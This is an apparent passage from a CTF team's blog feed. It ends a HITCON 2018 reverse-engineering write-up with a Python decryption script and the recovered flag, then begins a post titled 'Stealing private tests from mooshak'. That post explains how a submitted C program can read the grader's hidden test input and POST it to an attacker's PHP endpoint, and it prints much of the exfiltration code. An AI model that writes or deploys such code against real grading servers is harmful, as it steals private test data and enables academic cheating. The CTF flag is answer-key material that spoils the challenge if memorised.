class="number">0xBE</span>, <span class="number">0x98</span>, <span class="number">0xF2</span>, <span class="number">0xBE</span>, <span class="number">0xCA</span>, <span class="number">0x2F</span>, <span class="number">0x69</span>, <span class="number">0xCA</span>, <span class="number">0x2F</span>, <span class="number">0xB6</span>, <span class="number">0x74</span>, <span class="number">0x2F</span>, <span class="number">0x90</span>, <span class="number">0x67</span>, <span class="number">0x17</span>, <span class="number">0x90</span>, <span class="number">0xC4</span>, <span class="number">0x6A</span>, <span class="number">0xF1</span>, <span class="number">0xC4</span>, <span class="number">0xCC</span>, <span class="number">0xF0</span>, <span class="number">0xB4</span>, <span class="number">0xCC</span>, <span class="number">0xFA</span>, <span class="number">0xC8</span>, <span class="number">0x9E</span>, <span class="number">0xFA</span>, <span class="number">0x10</span>, <span class="number">0x5D</span>, <span class="number">0x8A</span>, <span class="number">0x10</span>, <span class="number">0x9C</span>, <span class="number">0xB0</span>, <span class="number">0xC4</span>, <span class="number">0x9C</span>, <span class="number">0xE9</span>, <span class="number">0x4E</span>, <span class="number">0xCE</span>, <span class="number">0xE9</span>, <span class="number">0x9B</span>, <span class="number">0x26</span>, <span class="number">0x88</span>, <span class="number">0x9B</span>, <span class="number">0x9A</span>, <span class="number">0x6F</span>, <span class="number">0x19</span>, <span class="number">0x9A</span>, <span class="number">0x13</span>, <span class="number">0x86</span>, <span class="number">0x50</span>, <span class="number">0x13</span>, <span class="number">0x4E</span>, <span class="number">0x58</span>, <span class="number">0x62</span>, <span class="number">0x4E</span>, <span class="number">0xA7</span>, <span class="number">0x16</span>, <span class="number">0xAC</span>, <span class="number">0xA7</span>, <span class="number">0x16</span>, <span class="number">0x82</span>, <span class="number">0x57</span>, <span class="number">0x16</span>, <span class="number">0xB3</span>, <span class="number">0x06</span>, <span class="number">0xB0</span>, <span class="number">0xB3</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Rotate left: 0b1001 --&gt; 0b0011</span></span><br><span class="line">rol = <span class="keyword">lambda</span> val, r_bits, max_bits: \</span><br><span class="line">    (val &lt;&lt; r_bits % max_bits) &amp; (<span class="number">2</span>**max_bits - <span class="number">1</span>) | \</span><br><span class="line">    ((val &amp; (<span class="number">2</span>**max_bits - <span class="number">1</span>)) &gt;&gt; (max_bits - (r_bits % max_bits)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Rotate right: 0b1001 --&gt; 0b1100</span></span><br><span class="line">ror = <span class="keyword">lambda</span> val, r_bits, max_bits: \</span><br><span class="line">    ((val &amp; (<span class="number">2</span>**max_bits - <span class="number">1</span>)) &gt;&gt; r_bits % max_bits) | \</span><br><span class="line">    (val &lt;&lt; (max_bits - (r_bits % max_bits)) &amp; (<span class="number">2</span>**max_bits - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">access_offstream</span><span class="params">(offset, index)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> array_of_ints_to_int(offset[index:index + <span class="number">4</span>][::<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">array_of_ints_to_int</span><span class="params">(a)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> int(<span class="string">''</span>.join(pack(<span class="string">'!B'</span>, x) <span class="keyword">for</span> x <span class="keyword">in</span> a).encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shr_add_xor</span><span class="params">(dword, offset, shifts, adds=[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>], muls=[<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>])</span>:</span></span><br><span class="line"></span><br><span class="line">    edx = ((dword &gt;&gt; shifts[<span class="number">0</span>] &amp; <span class="number">0xff</span>) + adds[<span class="number">0</span>]) * muls[<span class="number">0</span>]</span><br><span class="line">    a = array_of_ints_to_int(offset[edx:edx + <span class="number">4</span>][::<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">    edx = ((dword &gt;&gt; shifts[<span class="number">1</span>] &amp; <span class="number">0xff</span>) + adds[<span class="number">1</span>]) * muls[<span class="number">1</span>]</span><br><span class="line">    b = array_of_ints_to_int(offset[edx:edx + <span class="number">4</span>][::<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">    c = a ^ b</span><br><span class="line"></span><br><span class="line">    edx = ((dword &gt;&gt; shifts[<span class="number">2</span>] &amp; <span class="number">0xff</span>) + adds[<span class="number">2</span>]) * muls[<span class="number">2</span>]</span><br><span class="line">    d = array_of_ints_to_int(offset[edx:edx + <span class="number">4</span>][::<span class="number">-1</span>])</span><br><span class="line">    e = d ^ c</span><br><span class="line"></span><br><span class="line">    edx = ((dword &gt;&gt; shifts[<span class="number">3</span>] &amp; <span class="number">0xff</span>) + adds[<span class="number">3</span>]) * muls[<span class="number">3</span>]</span><br><span class="line">    f = array_of_ints_to_int(offset[edx:edx + <span class="number">4</span>][::<span class="number">-1</span>])</span><br><span class="line">    g = f ^ e</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a, b, c, d, f, g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum_sum_xor</span><span class="params">(dword0, dword1, dword3, offset, offset_index)</span>:</span></span><br><span class="line">    sum1 = (dword0 + dword1) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    sum2 = (</span><br><span class="line">        sum1 + array_of_ints_to_int(offset[offset_index:offset_index + <span class="number">4</span>][::<span class="number">-1</span>])) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">return</span> sum2 ^ dword3</span><br><span class="line"></span><br><span class="line">encrypted_flag = [<span class="number">0x4F</span>, <span class="number">0x6F</span>, <span class="number">0xA7</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, <span class="number">0x51</span>, <span class="number">0x87</span>, <span class="number">0x64</span>, <span class="number">0x38</span>, <span class="number">0x2A</span>,</span><br><span class="line">                  <span class="number">0x46</span>, <span class="number">0xE5</span>, <span class="number">0x4F</span>, <span class="number">0x21</span>, <span class="number">0x9E</span>, <span class="number">0x1C</span>, <span class="number">0xCD</span>, <span class="number">0x65</span>, <span class="number">0xE1</span>, <span class="number">0x9A</span>,</span><br><span class="line">                  <span class="number">0x4F</span>, <span class="number">0xCF</span>, <span class="number">0xDE</span>, <span class="number">0x52</span>, <span class="number">0x09</span>, <span class="number">0xBF</span>, <span class="number">0x53</span>, <span class="number">0xC4</span>, <span class="number">0xB0</span>, <span class="number">0x95</span>,</span><br><span class="line">                  <span class="number">0x75</span>, <span class="number">0x31</span>, <span class="number">0xAC</span>, <span class="number">0x2F</span>, <span class="number">0xF4</span>, <span class="number">0x97</span>, <span class="number">0x1D</span>, <span class="number">0xA5</span>, <span class="number">0x9A</span>, <span class="number">0x02</span>,</span><br><span class="line">                  <span class="number">0xA8</span>, <span class="number">0xFF</span>, <span class="number">0xAE</span>, <span class="number">0x2E</span>, <span class="number">0xB9</span>, <span class="number">0x70</span>, <span class="number">0xCC</span>, <span class="number">0x02</span>]</span><br><span class="line"></span><br><span class="line">xor_keys_input0 = [<span class="number">0</span>] * <span class="number">0x8</span></span><br><span class="line">xor_keys_input1 = [<span class="number">0</span>] * <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(len(encrypted_flag)):</span><br><span class="line">    <span class="keyword">if</span> (x % <span class="number">16</span>) &lt; <span class="number">8</span>:</span><br><span class="line">        xor_keys_input0.append(encrypted_flag[x])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        xor_keys_input1.append(encrypted_flag[x])</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">16</span> * <span class="number">3</span>, <span class="number">16</span>):</span><br><span class="line"></span><br><span class="line">    test = encrypted_flag[x:<span class="number">16</span> + x]</span><br><span class="line"></span><br><span class="line">    dword_560CC63C71B0 = test[:<span class="number">8</span>][::<span class="number">-1</span>]</span><br><span class="line">    dword_560CC63C71B8 = test[<span class="number">8</span>:][::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    dword_560CC63C71C0 = array_of_ints_to_int(dword_560CC63C71B8[<span class="number">-4</span>:])</span><br><span class="line">    dword_560CC63C71C4 = array_of_ints_to_int(dword_560CC63C71B8[:<span class="number">4</span>])</span><br><span class="line">    dword_560CC63C71C8 = array_of_ints_to_int(dword_560CC63C71B0[<span class="number">-4</span>:])</span><br><span class="line">    dword_560CC63C71CC = array_of_ints_to_int(dword_560CC63C71B0[:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">    dword_560CC63C71C8 = dword_560CC63C71C8 ^ access_offstream(</span><br><span class="line">        off_560CC63C7150, <span class="number">0x10</span>)</span><br><span class="line">    dword_560CC63C71CC = dword_560CC63C71CC ^ access_offstream(</span><br><span class="line">        off_560CC63C7150, <span class="number">0x14</span>)</span><br><span class="line">    dword_560CC63C71C0 = dword_560CC63C71C0 ^ access_offstream(</span><br><span class="line">        off_560CC63C7150, <span class="number">0x18</span>)</span><br><span class="line">    dword_560CC63C71C4 = dword_560CC63C71C4 ^ access_offstream(</span><br><span class="line">        off_560CC63C7150, <span class="number">0x1c</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span> * <span class="number">7</span>, <span class="number">-16</span>, <span class="number">-16</span>):</span><br><span class="line">        dword_560CC63C71D0 = shr_add_xor(dword_560CC63C71C8, off_560CC63C7150, [</span><br><span class="line">                                         <span class="number">0</span>, <span class="number">8</span>, <span class="number">0x10</span>, <span class="number">0x18</span>], [<span class="number">0x40</span>, <span class="number">0x140</span>, <span class="number">0x240</span>, <span class="number">0x340</span>], [<span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>])[<span class="number">-1</span>]</span><br><span class="line">        dword_560CC63C71D4 = shr_add_xor(dword_560CC63C71CC, off_560CC63C7150, [</span><br><span class="line">                                         <span class="number">0x18</span>, <span class="number">0</span>, <span class="number">0x8</span>, <span class="number">0x10</span>], [<span class="number">0x40</span>, <span class="number">0x140</span>, <span class="number">0x240</span>, <span class="number">0x340</span>], [<span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>])[<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">        edx = dword_560CC63C71D0 + \</span><br><span class="line">            (dword_560CC63C71D4 + dword_560CC63C71D4) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        eax = (array_of_ints_to_int(off_560CC63C7150[</span><br><span class="line">               <span class="number">0x2c</span> + i:<span class="number">0x2c</span> + <span class="number">4</span> + i][::<span class="number">-1</span>]) + edx) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">        dword_560CC63C71C4 = dword_560CC63C71C4 ^ eax</span><br><span class="line">        dword_560CC63C71C4 = ror(dword_560CC63C71C4, <span class="number">1</span>, max_bits)</span><br><span class="line">        dword_560CC63C71C0 = rol(dword_560CC63C71C0, <span class="number">1</span>, max_bits)</span><br><span class="line">        dword_560CC63C71C0 = sum_sum_xor(</span><br><span class="line">            dword_560CC63C71D0, dword_560CC63C71D4, dword_560CC63C71C0, off_560CC63C7150, <span class="number">0x28</span> + i)</span><br><span class="line"></span><br><span class="line">        dword_560CC63C71D0 = shr_add_xor(dword_560CC63C71C0, off_560CC63C7150, [</span><br><span class="line">                                         <span class="number">0</span>, <span class="number">8</span>, <span class="number">0x10</span>, <span class="number">0x18</span>], [<span class="number">0x40</span>, <span class="number">0x140</span>, <span class="number">0x240</span>, <span class="number">0x340</span>], [<span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>])[<span class="number">-1</span>]</span><br><span class="line">        dword_560CC63C71D4 = shr_add_xor(dword_560CC63C71C4, off_560CC63C7150, [</span><br><span class="line">                                         <span class="number">0x18</span>, <span class="number">0</span>, <span class="number">0x8</span>, <span class="number">0x10</span>], [<span class="number">0x40</span>, <span class="number">0x140</span>, <span class="number">0x240</span>, <span class="number">0x340</span>], [<span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>])[<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">        edx = dword_560CC63C71D0 + \</span><br><span class="line">            ((dword_560CC63C71D4 + dword_560CC63C71D4) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">        eax = (array_of_ints_to_int(off_560CC63C7150[</span><br><span class="line">               <span class="number">0x24</span> + i:<span class="number">0x24</span> + <span class="number">4</span> + i][::<span class="number">-1</span>]) + edx) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">        dword_560CC63C71CC = dword_560CC63C71CC ^ eax</span><br><span class="line">        dword_560CC63C71CC = ror(dword_560CC63C71CC, <span class="number">1</span>, max_bits)</span><br><span class="line">        dword_560CC63C71C8 = rol(dword_560CC63C71C8, <span class="number">1</span>, max_bits)</span><br><span class="line">        dword_560CC63C71C8 = sum_sum_xor(</span><br><span class="line">            dword_560CC63C71D0, dword_560CC63C71D4, dword_560CC63C71C8, off_560CC63C7150, <span class="number">0x20</span> + i)</span><br><span class="line"></span><br><span class="line">    dwords_flaginput = [dword_560CC63C71C8, dword_560CC63C71CC]</span><br><span class="line">    dwords_flaginput2 = [dword_560CC63C71C0, dword_560CC63C71C4]</span><br><span class="line"></span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">8</span>, <span class="number">4</span>):</span><br><span class="line">        s += pack(<span class="string">"&lt;I"</span>, dwords_flaginput2[k] ^</span><br><span class="line">                  access_offstream(off_560CC63C7150, i))</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    s = pack(<span class="string">"&gt;Q"</span>, int(s.encode(<span class="string">'hex'</span>), <span class="number">16</span>) ^</span><br><span class="line">             array_of_ints_to_int(xor_keys_input0[x / <span class="number">2</span>:x / <span class="number">2</span> + <span class="number">8</span>]))</span><br><span class="line">    s1 = <span class="string">''</span></span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>, <span class="number">8</span> * <span class="number">2</span>, <span class="number">4</span>):</span><br><span class="line">        s1 += pack(<span class="string">"&lt;I"</span>, dwords_flaginput[k] ^</span><br><span class="line">                   access_offstream(off_560CC63C7150, i))</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    s1 = pack(<span class="string">"&gt;Q"</span>, int(s1.encode(<span class="string">'hex'</span>), <span class="number">16</span>) ^</span><br><span class="line">              array_of_ints_to_int(xor_keys_input1[x / <span class="number">2</span>:x / <span class="number">2</span> + <span class="number">8</span>]))</span><br><span class="line"></span><br><span class="line">    flag += s + s1</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"hitcon&#123;"</span>+flag+<span class="string">"&#125;"</span></span><br></pre></td></tr></table></figure><p>Running it to get the flag :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python reverselukaku.py </span><br><span class="line">hitcon&#123;~Exc3p7i0n-Ori3n7ed-Pr0grammin9~RoO0cks!!\o^_^o/&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;br&gt;EOP&lt;br&gt;&lt;br&gt;EOP.&lt;br&gt;&lt;br&gt;eop-811afa1b9fb0c0719a75afd316ea2c57&lt;br&gt;Author: david942j&lt;br&gt;29 Teams solved.&lt;br&gt;&lt;br&gt;&lt;/blockquote&gt;

&lt;
      
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="ida" scheme="https://teamrocketist.github.io/tags/ida/"/>
    
      <category term="exceptions" scheme="https://teamrocketist.github.io/tags/exceptions/"/>
    
      <category term="hitcon2018" scheme="https://teamrocketist.github.io/tags/hitcon2018/"/>
    
  </entry>
  
  <entry>
    <title>[Web] Mooshak - Stealing private tests from mooshak</title>
    <link href="https://teamrocketist.github.io/2018/10/14/Web-Mooshak-Stealing-private-tests-from-mooshak/"/>
    <id>https://teamrocketist.github.io/2018/10/14/Web-Mooshak-Stealing-private-tests-from-mooshak/</id>
    <published>2018-10-14T20:01:50.000Z</published>
    <updated>2018-10-24T23:21:04.838Z</updated>
    
    <content type="html"><![CDATA[<p>A long time ago in a secret meme group far far away I did find this:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/Be1WLE5.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Be1WLE5.png" alt=""><br></a></p><p>This meme made me giggle straight way, not because of the meme itself but the message “If we only could do this”, back in the day I already how to do it but never tested it out in a live server for obvious reasons and lets make it clear IST projects nowadays are so easy we don’t really need have to cheat.</p><p>Finally decided to do a write up about this, I downloaded <a href="https://mooshak.dcc.fc.up.pt/" target="_blank" rel="noopener">mooshak</a> and installed on a VM machine and created a c contest. I don’t really consider this an attack or a hack, if we were talking about games we could easily say this was “clever use of game mechanics”, as you know most of the project contests in IST have this basic idea to run tests:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input -&gt; Receives the input of a specific test into your program.</span><br><span class="line">Output -&gt; Compares the output of your project and server output (this is what determines whether you passed or not a test).</span><br></pre></td></tr></table></figure><p>As we know we are going to read the input into memory, since we can <strong><em>control the code</em></strong> and what is running, we just need to find a way to <strong><em>sent the information out</em></strong> to ourselves, one way to do this is by using <strong><em>GET</em></strong> or <strong><em>POST</em></strong> requests:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/VpElHW1.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/VpElHW1.png" alt=""><br></a></p><p>The <strong><em>GET</em></strong> request has a limit of 8192 bytes so in a bigger input test you won’t be able to send the entire test so I recommend to use a <strong><em>POST</em></strong> , writing the code necessary in c to do this is quite challenging but in another languages like python, lisp or even prolog is quite simple, speaking about the endpoint that are going to receive our requests you either write in php or any other language.</p><p>The test.c file:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _DEFAULT_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_tcp_socket</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">get_ip</span><span class="params">(<span class="keyword">char</span> *host)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">build_get_query</span><span class="params">(<span class="keyword">char</span> *host, <span class="keyword">char</span> *page)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usage</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">join_strings</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">http_request</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span>* path, <span class="keyword">char</span>* method)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">build_post_query</span><span class="params">(<span class="keyword">char</span> *host, <span class="keyword">char</span> *page, <span class="keyword">char</span>* post_data)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HOST <span class="meta-string">"127.0.0.1"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE <span class="meta-string">"/wtf.php"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 80</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USERAGENT <span class="meta-string">"HTMLGET 1.0"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">url_encode</span><span class="params">(<span class="keyword">char</span> *str)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET request limit is 8192 bytes we could try a post request but would be to heavy to ther server with 1 million nodes*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> *str;</span><br><span class="line">  <span class="keyword">char</span> c; </span><br><span class="line">  <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> size = <span class="number">16</span>;</span><br><span class="line">  http_request(<span class="number">3</span>, argv, url_encode(<span class="string">"---------------"</span>), <span class="string">"post"</span>);</span><br><span class="line">  str = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*size + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">while</span> ((c = getchar()) != EOF) &#123;</span><br><span class="line">    str[i++]=c;</span><br><span class="line">    <span class="keyword">if</span> (i == size) &#123;</span><br><span class="line">        str = <span class="built_in">realloc</span>(str, <span class="keyword">sizeof</span>(<span class="keyword">char</span>)*(size+=<span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  str[i++]=<span class="string">'\0'</span>;</span><br><span class="line">  http_request(<span class="number">3</span>, argv, url_encode(str), <span class="string">"post"</span>);</span><br><span class="line">  <span class="built_in">free</span>(str);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Converts a hex character to its integer value */</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">from_hex</span><span class="params">(<span class="keyword">char</span> ch)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">isdigit</span>(ch) ? ch - <span class="string">'0'</span> : <span class="built_in">tolower</span>(ch) - <span class="string">'a'</span> + <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Converts an integer value to its hex character*/</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">to_hex</span><span class="params">(<span class="keyword">char</span> code)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">char</span> hex[] = <span class="string">"0123456789abcdef"</span>;</span><br><span class="line">  <span class="keyword">return</span> hex[code &amp; <span class="number">15</span>];</span><br><span class="line">&#125;</span><br><span 